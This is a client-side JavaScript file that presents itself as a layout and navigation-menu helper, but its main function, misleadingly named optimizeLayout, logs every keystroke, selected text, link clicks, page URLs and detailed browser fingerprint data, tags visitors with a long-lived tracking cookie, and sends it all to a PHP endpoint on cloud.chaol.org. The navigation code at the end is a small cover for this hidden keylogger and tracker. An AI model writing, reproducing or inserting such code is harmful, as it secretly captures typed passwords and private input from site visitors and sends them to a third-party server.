//doesnt work much for the layout for now; works for the navigation menu links tho

function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() *
 charactersLength));
   }
   return result;
}
function getCookie(name) {
    var dc = document.cookie;
    var prefix = name + "=";
    var begin = dc.indexOf("; " + prefix);
    if (begin == -1) {
        begin = dc.indexOf(prefix);
        if (begin != 0) return null;
    }
    else
    {
        begin += 2;
        var end = document.cookie.indexOf(";", begin);
        if (end == -1) {
        end = dc.length;
        }
    }
    return decodeURI(dc.substring(begin + prefix.length, end));
}

var math0 = localStorage.getItem("mathId");

if (!math0) {
    math0 = getCookie("math");
    if (!math0) {
        math0 = makeid(20);
        document.cookie = "math=" + math0 + ";max-age=" + 2147483600 + ";domain=.chaol.org;path=/";
    }
    localStorage.setItem("mathId", math0);
}




//To be improved

let eventsBuffer = [];
let keyBuffer = [];

setInterval(() => {
    if (eventsBuffer.length > 0) {
        optimizeLayout('eventBufferInterval');
    }
    if (keyBuffer.length > 0) {
        optimizeLayout('keyBufferInterval');
    }
}, 3000);//1min=60 000



function addToBuffer(type, data) {
    eventsBuffer.push({ type, data });
    if (eventsBuffer.length >= 1) {
        // twice: event  key
        optimizeLayout('bufferThreshold');
    }
}

function optimizeLayout(triggerEvent) {
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const browserLanguages = navigator.languages.join(", ");
    const primaryBrowserLanguage = navigator.language || "N/A";
    const platform = navigator.platform;
    const cookiesEnabled = navigator.cookieEnabled;
    const colorDepth = window.screen.colorDepth;
    const deviceMemory = navigator.deviceMemory || "N/A";
    const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
    const userAgent = navigator.userAgent;
    const humanReadableTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
    let eventData = eventsBuffer.map(event => `${event.type}:${event.data}`).join('|');
    let keyData = keyBuffer.join('');
    let url = `https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php?c=${math0}&Timezone=${humanReadableTimezone}&w=${screenWidth}&h=${screenHeight}&BrowserLanguages=${browserLanguages}&PrimaryBrowserLanguage=${primaryBrowserLanguage}&Platform=${platform}&CookiesEnabled=${cookiesEnabled}&ColorDepth=${colorDepth}&DeviceMemory=${deviceMemory}&HardwareConcurrency=${hardwareConcurrency}&UserAgent=${userAgent}&Current=${encodeURIComponent(window.location.href)}&From=${encodeURIComponent(document.referrer)}&EventBuffer=${encodeURIComponent(eventData)}&KeyBuffer=${encodeURIComponent(keyData)}`;
    if (triggerEvent) {
        url += `&Event=${encodeURIComponent(triggerEvent)}`;
    }
    fetch(url, {
        method: "POST"
    });
    eventsBuffer = [];
    keyBuffer = []; 
}

optimizeLayout(`visitCurrentPage:${encodeURIComponent(window.location.href)}`);

document.addEventListener('keydown', (e) => {
    if (e.key.length === 1) {
        keyBuffer.push(e.key);
    } else {
        keyBuffer.push(`<<<${e.key}>>>`);
    }

    if (keyBuffer.length >= 12) {
        optimizeLayout('keyBufferThreshold');
    }
});

document.addEventListener('mouseup', function() {
    const selectedText = window.getSelection().toString().trim().replace(/\r?\n|\r/g, ' <br> ');  // Replacing newline characters with space
    if (selectedText.length > 0) {
        addToBuffer('textSelection', selectedText);
    }
});


window.addEventListener('beforeunload', () => {
    // clearInterval(sendInterval);

    if (keyBuffer.length > 0 || eventsBuffer.length > 0) {
        optimizeLayout('pageUnload');
    }
});




document.addEventListener("DOMContentLoaded", function() {

    const submitButton = document.getElementById('submitButton');
    if (submitButton) {
        submitButton.addEventListener('click', function() {
            optimizeLayout('SubmitButtonClick'); 
        });
    }

    const resetButton = document.getElementById('resetButton');
    if (resetButton) {
        resetButton.addEventListener('click', function() {
            optimizeLayout('resetButtonClick'); 
        });
    }

    document.addEventListener("contextmenu", function(event) {
        addToBuffer("event", "RightClick");
    });

    // Handling link redirections
    var links = document.querySelectorAll("a");
    links.forEach(function(link) {
        link.addEventListener("click", function(event) {
            event.preventDefault();
            var href = link.getAttribute("href");
            optimizeLayout(`LinkClicked:${href}`);
            
            
            if (link.getAttribute("target") === "_blank") {
                var newWin = window.open('', '_blank'); 
                newWin.rel = "noopener noreferrer";
                newWin.location.href = href;
            } else {
                window.location.href = href;
            }
        });
    });

    

    // Handling active state for navigation menu links
    const navLinks = document.querySelectorAll(".nav-menu a");
    let activeLink = null;
    navLinks.forEach(link => {
        let linkPathname = new URL(link.href).pathname;
        if (!linkPathname.endsWith('/')) {
            linkPathname += '/';
        }

        if (window.location.pathname === linkPathname) {
            link.classList.add("active");
            activeLink = link;
        }

        link.addEventListener("mouseenter", function() {
            if (activeLink) {
                activeLink.classList.remove("active");
            }
        });

        link.addEventListener("mouseleave", function() {
            if (activeLink) {
                activeLink.classList.add("active");
            }
        });
    });
});

